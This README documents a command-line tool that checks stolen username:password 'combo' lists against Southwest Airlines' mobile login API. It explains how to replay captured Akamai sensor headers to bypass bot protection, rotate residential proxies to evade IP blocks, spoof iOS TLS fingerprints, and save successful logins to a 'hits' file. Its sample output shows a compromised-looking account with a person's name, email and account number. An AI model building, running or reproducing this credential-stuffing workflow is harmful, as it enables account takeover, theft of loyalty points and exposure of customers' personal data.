# Southwest Rapid Rewards Points Checker

Checks Southwest Airlines Rapid Rewards account balances using the mobile API (`mobile.southwest.com`).

## How it works

1. Capture a login session from the Southwest iOS app using Charles Proxy
2. Extract Akamai sensor headers from the `.chlz` capture
3. Reuse those headers to authenticate accounts and read points from the login response

The login endpoint returns full account info including redeemable points, tier status, and companion pass progress — no separate points API call needed.

## Setup

```bash
pip install -r requirements.txt
```

## Usage

### Step 1: Extract sensor headers from a Charles capture

Capture a successful login from the Southwest iOS app in Charles Proxy, then export/save the session as a `.chlz` file.

```bash
python -m southwest_checker extract capture.chlz -o sensor_config.json
```

This extracts the Akamai APIGuard sensor headers (`X-dUblrIiu-*`) required to bypass bot protection.

### Step 2: Check accounts

Single account:

```bash
python -m southwest_checker check -c sensor_config.json -u gulley88 -p 'YourPassword'
```

Combo file (`username:password` per line):

```bash
python -m southwest_checker check -c sensor_config.json -f combos.txt --hits-file hits.txt
```

### Proxy (residential rotating)

Use a residential proxy to avoid IP blocks. Supports full URL or shorthand `host:port:user:pass`:

```bash
# Via CLI flag
python -m southwest_checker check -c sensor_config.json -f combos.txt \
  --proxy "core-residential.evomi.com:1000:USER:PASS_country-US"

# Via environment variable
export SW_PROXY="core-residential.evomi.com:1000:USER:PASS_country-US"
python -m southwest_checker check -c sensor_config.json -f combos.txt

# Or store in sensor_config.json
# { "proxy": "host:port:user:pass", ... }
```

Save results as JSON:

```bash
python -m southwest_checker check -c sensor_config.json -f combos.txt --json-output results.json
```

## Output

```
[HIT] gulley88 | Points: 45,230 | Tier: A_LIST | Account: 23305211731 | Name: Dustin Gulley | Email: gulley88@gmail.com
[BAD] baduser | invalid_grant
[RETRY] user123 | Akamai blocked (429) — sensor headers may be expired
```

## API details (from capture)

| Step | Method | Endpoint |
|------|--------|----------|
| Login | POST | `/api/security/v4/security/token` |
| User info | GET | `/api/security/v4/security/userinfo` |

Login body:

```
scope=openid&username=USER&response_type=id_token swa_token&client_id=26f1ee9f-a921-4735-8f5d-856401d6656a&password=PASS
```

Key response fields:

- `customers.userInformation.redeemablePoints`
- `customers.userInformation.tier`
- `customers.userInformation.accountNumber`
- `customers.userInformation.firstName` / `lastName`
- `customers.userInformation.nextTierTargeted`
- `customers.userInformation.companionPassInfo.companionQualifyingPointsRemaining`

## Notes

- **Sensor headers expire.** When you start getting 429 errors, capture a fresh login session from the app and re-run `extract`.
- **Rate limiting:** Use `--delay 2` (default) or higher between checks to avoid Akamai throttling.
- **TLS fingerprinting:** Uses `curl_cffi` with Safari iOS impersonation to match the mobile app.
